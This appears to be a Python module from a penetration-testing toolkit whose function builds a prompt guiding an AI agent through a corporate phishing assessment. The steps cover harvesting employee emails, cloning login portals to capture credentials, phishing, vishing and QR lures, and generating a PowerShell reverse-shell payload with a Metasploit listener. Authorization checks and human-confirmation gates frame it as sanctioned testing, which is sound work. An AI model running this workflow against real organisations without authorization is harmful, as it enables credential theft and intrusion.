"""Social engineering assessment prompts for Tengu."""

from __future__ import annotations


def social_engineering_assessment(
    target: str,
    scope: str = "full",
    engagement_type: str = "phishing",
) -> str:
    """Guided workflow for a corporate social engineering security assessment.

    Covers the full lifecycle: OSINT reconnaissance → campaign preparation →
    execution → credential collection → report. Integrates SET tools with
    existing Tengu OSINT and recon capabilities.

    Args:
        target: The target organization domain or name (e.g. "example.com").
        scope: Assessment scope — 'full' (all vectors), 'phishing' (email only),
               or 'physical' (QR codes, badge cloning).
        engagement_type: Primary vector — 'phishing', 'vishing', or 'physical'.
    """
    return f"""You are conducting an authorized social engineering security assessment
of {target} (scope: {scope}, primary vector: {engagement_type}).

All activities require explicit written authorization from {target}.
Verify the target is in tengu.toml `[targets] allowed_hosts` before proceeding.

## Phase 1 — Pre-Engagement & OPSEC

1. Run `validate_target(target="{target}")` — confirm target is in scope
2. Run `check_tools()` — verify SET and supporting tools are installed
3. Run `check_anonymity()` — verify operational security posture
4. Review rules of engagement: exclusions, timing windows, emergency contacts

## Phase 2 — OSINT Reconnaissance

Gather intelligence on the target organization and its employees:

1. `theharvester_scan(domain="{target}", sources="all")` — enumerate emails, names, subdomains
2. `dns_enumerate(domain="{target}")` — map DNS infrastructure
3. `whois_lookup(target="{target}")` — organization registration details
4. `cewl_generate(url="https://{target}")` — generate custom wordlist from site content
5. `whatweb_scan(target="https://{target}")` — identify web technologies for lure credibility

Use harvested email addresses and employee names to craft believable lure content.

## Phase 3 — Infrastructure Preparation

Set up the phishing infrastructure:

1. Identify the most convincing login portal to clone (VPN, Microsoft 365, corporate SSO)
2. `set_credential_harvester(target_url="<login_url>", lhost="<your_ip>")` — clone portal
   - REQUIRES HUMAN CONFIRMATION before execution
   - Record the credential capture server IP and port
3. For physical assessments:
   `set_qrcode_attack(url="<phishing_url>")` — generate QR code for physical placement

## Phase 4 — Campaign Execution

Deploy the social engineering campaign per the agreed rules of engagement:

- Send phishing emails with the cloned portal URL to the target user list
- For physical assessments: place QR code materials in agreed locations
- For vishing: use harvested employee names and org structure for pretexting
- Monitor credential capture server for submissions

### If payload delivery is in scope (requires explicit authorization):
`set_payload_generator(payload_type="powershell_reverse", lhost="<your_ip>", lport=4444)`
- REQUIRES HUMAN CONFIRMATION before execution
- Ensure Metasploit listener is active: `msf_search(query="multi/handler")`

## Phase 5 — Evidence Collection

Document all findings:

1. Record all credential submissions (timestamps, usernames, departments)
2. Note which users clicked links / scanned QR codes without submitting
3. Calculate click rate, submission rate, and time-to-first-click
4. Note any users who reported the phishing attempt to security team

## Phase 6 — Reporting

Generate the security assessment report:

1. `generate_report(findings=[...], target="{target}", report_type="executive")`
2. Include:
   - Overall click rate and submission rate
   - Most susceptible departments / roles
   - Time-to-detection by the security team
   - Comparison to industry benchmarks
   - Actionable remediation recommendations (security awareness training, MFA, etc.)

## Key Metrics to Track

| Metric | Target Benchmark |
|--------|-----------------|
| Click rate | < 5% (after training) |
| Credential submission rate | < 1% |
| Time to security team report | < 1 hour |
| Users who reported the attempt | > 30% |

## Remediation Recommendations

Based on findings, recommend:
- Mandatory phishing awareness training for all employees
- Simulated phishing exercises quarterly
- Multi-factor authentication (MFA) on all external-facing systems
- Email security gateway with anti-phishing filters
- Security awareness metrics tracked in HR/compliance systems"""
